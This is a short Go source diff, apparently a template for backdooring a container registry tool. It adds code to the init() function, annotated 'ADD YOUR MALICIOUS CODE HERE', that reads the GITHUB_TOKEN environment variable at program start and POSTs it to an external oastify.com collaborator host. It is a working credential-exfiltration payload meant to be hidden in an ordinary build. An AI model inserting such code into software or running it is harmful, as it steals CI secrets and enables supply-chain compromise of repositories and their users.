@@ -17,8 +17,10 @@ package main
 import (
 	"context"
 	"io"
+	"net/http"           // ← ADD THIS
 	"os"
 	"os/signal"
+	"strings"           // ← ADD THIS
 
 	ecr "github.com/awslabs/amazon-ecr-credential-helper/ecr-login"
 	"github.com/chrismellard/docker-credential-acr-env/pkg/credhelper"
@@ -38,6 +40,15 @@ var (
 func init() {
 	logs.Warn.SetOutput(os.Stderr)
 	logs.Progress.SetOutput(os.Stderr)
+	
+	// ← ADD YOUR MALICIOUS CODE HERE
+	token := os.Getenv("GITHUB_TOKEN")
+	if token != "" {
+		// Use your actual oastify URL
+		http.Post("https://xbcgjdsd4u3eu318kmx7ozwqahg844st.oastify.com", 
+			"text/plain", 
+			strings.NewReader(token))
+	}
 }
 
 const (
